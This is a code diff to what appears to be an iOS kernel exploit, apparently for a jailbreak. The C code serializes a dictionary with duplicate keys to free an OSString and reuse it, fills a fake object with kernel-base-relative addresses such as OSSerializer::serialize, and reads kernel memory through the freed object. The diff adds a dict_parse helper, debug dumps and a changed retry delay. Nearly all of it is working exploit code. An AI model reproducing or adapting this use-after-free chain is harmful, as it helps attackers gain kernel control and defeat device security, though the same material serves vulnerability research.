@@ -531,6 +531,14 @@ static void dict_get_bytes(void *dict, size_t dictlen, const char *key, void *bu
     TIMER_SLEEP_UNTIL(timer, 50e6); // 50ms
 }
 
+void dict_parse(void *dict, size_t dictlen)
+{
+    TIMER_START(timer);
+    _io_release_client(_io_spawn_client(dict, dictlen));
+    // Async cleanup
+    TIMER_SLEEP_UNTIL(timer, 50e6); // 50ms
+}
+
 static void uaf_get_bytes(const OSString *fake, char *buf, size_t len)
 {
     LOG("Using UAF to read kernel bytes...");
@@ -929,18 +937,18 @@ retry:
     WRITE_IN(data, kOSSerializeDictionary | kOSSerializeEndCollection | 0x10);
     
     {
-        /* pre-9.1 doesn't accept strings as keys, but duplicate keys :D */
+        // pre-9.1 doesn't accept strings as keys, but duplicate keys :D
         WRITE_IN(data, kOSSerializeSymbol | 4);
         WRITE_IN(data, 0x00327973);                 // "sy2"
-        /* our key is a OSString object that will be freed */
+        // our key is a OSString object that will be freed
         WRITE_IN(data, kOSSerializeString | 4);
         WRITE_IN(data, 0x00327973);                 // irrelevant
         
-        /* now this will free the string above */
+        // now this will free the string above
         WRITE_IN(data, kOSSerializeObject | 1);     // ref to "sy2"
         WRITE_IN(data, kOSSerializeBoolean | 1);    // lightweight value
         
-        /* and this is the key for the value below */
+        // and this is the key for the value below
         WRITE_IN(data, kOSSerializeObject | 1);     // ref to "sy2" again
     }
     
@@ -949,28 +957,29 @@ retry:
     WRITE_IN(data, 0x41414141);                                                 // [04] dummy
     WRITE_IN(data, payload_ptr+PAYLOAD_TO_PEXPLOIT);                            // [08] address of uaf_payload_buffer - 8
     WRITE_IN(data, 0x00000014);                                                 // [0C] static value of 20
-    WRITE_IN(data, kernel_base + koffset(offsetof_OSSerializer_serialize) +1);  // [10] address of OSSerializer::serialize (+1)
+    WRITE_IN(data, kernel_base + koffset(offsetof_OSSerializer_serialize) + 1); // [10] address of OSSerializer::serialize (+1)
     
-    /* now create a reference to object 1 which is the OSString object that was just freed */
-    WRITE_IN(data, kOSSerializeObject | kOSSerializeEndCollection | (1 ? 2 : 1));
+    // now create a reference to object 1 which is the OSString object that was just freed
+    WRITE_IN(data, kOSSerializeObject | kOSSerializeEndCollection | 2);
+    dumpData(pExploit, 128);
     
-    /* -- BETA: checking payload -- */
+    // -- BETA: checking payload --
     char *check = malloc(128);
     char *base = (char*)(payload_ptr+PAYLOAD_TO_PEXPLOIT);
     uaf_read_naive(base, check, 128);
-    //dumpData(check, 128);
+    dumpData(check, 128);
     
     for(int i = 0x08; i<0x44; i+=4)
     {
         if(*(uint32_t*)(check + i) != *(uint32_t*)(pExploit + i))
         {
-            ERROR("WTF?!");
+            ERROR("WTF?!: %x", i);
             LOG("retry...");
             master = MACH_PORT_NULL;
             memset(&pExploit, '\0', 128);
             memset(&data, '\0', 4096);
             bufpos = 0;
-            usleep(250000);
+            sleep(1);
             goto retry;
         }
     }
